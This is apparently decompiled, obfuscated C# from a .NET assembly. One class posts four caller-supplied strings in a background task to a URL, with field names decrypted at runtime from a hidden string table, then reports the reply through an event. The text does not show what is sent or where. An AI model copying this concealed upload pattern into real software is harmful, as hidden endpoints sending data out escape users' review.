using System;
using System.Collections.Specialized;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace A
{
	// Token: 0x02000006 RID: 6
	public class c80c398cf4e6b2fb091b88536098e2d6b
	{
		// Token: 0x0600000E RID: 14 RVA: 0x000029F8 File Offset: 0x00000BF8
		public c80c398cf4e6b2fb091b88536098e2d6b(string c9b5f584b974d94e7c305409ed2ae6500, string cda8d357f97f2881c4f16f3cd2f24580c, string cfeefea196000bed18adf05bf7727db15, string c792e9bc34c43ed24db7ff0472b8d0fc5 = "")
		{
			this.ce03eeb466c527c7940b0e9fc6b6e0a7c = cda8d357f97f2881c4f16f3cd2f24580c;
			this.c90906990bbc0f04edd7b8e8856d45cfb = cfeefea196000bed18adf05bf7727db15;
			this.ce3ed91ee1071e84bab35524111ae43cf = c792e9bc34c43ed24db7ff0472b8d0fc5;
			this.c4371becd41f336429e408b9b738c74c8 = c9b5f584b974d94e7c305409ed2ae6500;
		}

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x0600000F RID: 15 RVA: 0x00002A28 File Offset: 0x00000C28
		// (remove) Token: 0x06000010 RID: 16 RVA: 0x00002A78 File Offset: 0x00000C78
		public event EventHandler<string> c5d9ebe1d817df2cbd911e6ff282ee099
		{
			[CompilerGenerated]
			add
			{
				EventHandler<string> eventHandler = this.c5d9ebe1d817df2cbd911e6ff282ee099;
				EventHandler<string> eventHandler2;
				do
				{
					eventHandler2 = eventHandler;
					EventHandler<string> value2 = cb137dbf62cacb3d6d5a05e5cc026608a.cd24593c859565ebb8c9faabbc5c75bef(Delegate.Combine(eventHandler2, value));
					eventHandler = Interlocked.CompareExchange<EventHandler<string>>(ref this.c5d9ebe1d817df2cbd911e6ff282ee099, value2, eventHandler2);
				}
				while (eventHandler != eventHandler2);
				for (;;)
				{
					switch (4)
					{
					case 0:
						continue;
					}
					break;
				}
				if (!true)
				{
					RuntimeMethodHandle runtimeMethodHandle = methodof(c80c398cf4e6b2fb091b88536098e2d6b.add_c5d9ebe1d817df2cbd911e6ff282ee099(EventHandler<string>)).MethodHandle;
				}
			}
			[CompilerGenerated]
			remove
			{
				EventHandler<string> eventHandler = this.c5d9ebe1d817df2cbd911e6ff282ee099;
				EventHandler<string> eventHandler2;
				do
				{
					eventHandler2 = eventHandler;
					EventHandler<string> value2 = cb137dbf62cacb3d6d5a05e5cc026608a.cd24593c859565ebb8c9faabbc5c75bef(Delegate.Remove(eventHandler2, value));
					eventHandler = Interlocked.CompareExchange<EventHandler<string>>(ref this.c5d9ebe1d817df2cbd911e6ff282ee099, value2, eventHandler2);
				}
				while (eventHandler != eventHandler2);
				for (;;)
				{
					switch (4)
					{
					case 0:
						continue;
					}
					break;
				}
				if (!true)
				{
					RuntimeMethodHandle runtimeMethodHandle = methodof(c80c398cf4e6b2fb091b88536098e2d6b.remove_c5d9ebe1d817df2cbd911e6ff282ee099(EventHandler<string>)).MethodHandle;
				}
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002AC8 File Offset: 0x00000CC8
		public void c6ab500c9dee17a8b7221ca64ea543b6d()
		{
			Task.Run(new Action(this.c2a64d8c2744e859a1df2aeed5324e027));
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002AEC File Offset: 0x00000CEC
		[CompilerGenerated]
		private void c2a64d8c2744e859a1df2aeed5324e027()
		{
			try
			{
				string @string = Encoding.UTF8.GetString(new WebClient().UploadValues(ceffa389ee86c0ee26f31dd3efacbdd38.c5dd75c94760bfb37727a44ddc794d278(331), new NameValueCollection
				{
					{
						ceffa389ee86c0ee26f31dd3efacbdd38.c5dd75c94760bfb37727a44ddc794d278(426),
						this.c4371becd41f336429e408b9b738c74c8
					},
					{
						ceffa389ee86c0ee26f31dd3efacbdd38.c5dd75c94760bfb37727a44ddc794d278(435),
						this.ce03eeb466c527c7940b0e9fc6b6e0a7c
					},
					{
						ceffa389ee86c0ee26f31dd3efacbdd38.c5dd75c94760bfb37727a44ddc794d278(450),
						this.c90906990bbc0f04edd7b8e8856d45cfb
					},
					{
						ceffa389ee86c0ee26f31dd3efacbdd38.c5dd75c94760bfb37727a44ddc794d278(465),
						this.ce3ed91ee1071e84bab35524111ae43cf
					}
				}));
				this.c5d9ebe1d817df2cbd911e6ff282ee099(this, @string);
			}
			catch (Exception ex)
			{
				EventHandler<string> eventHandler = this.c5d9ebe1d817df2cbd911e6ff282ee099;
				if (eventHandler == null)
				{
					for (;;)
					{
						switch (4)
						{
						case 0:
							continue;
						}
						break;
					}
					if (!true)
					{
						RuntimeMethodHandle runtimeMethodHandle = methodof(c80c398cf4e6b2fb091b88536098e2d6b.c2a64d8c2744e859a1df2aeed5324e027()).MethodHandle;
					}
				}
				else
				{
					eventHandler(this, ex.ToString());
				}
			}
		}

		// Token: 0x04000005 RID: 5
		private string c4371becd41f336429e408b9b738c74c8;

		// Token: 0x04000006 RID: 6
		private string c90906990bbc0f04edd7b8e8856d45cfb;

		// Token: 0x04000007 RID: 7
		private string ce3ed91ee1071e84bab35524111ae43cf;

		// Token: 0x04000008 RID: 8
		private string ce03eeb466c527c7940b0e9fc6b6e0a7c;
	}
}
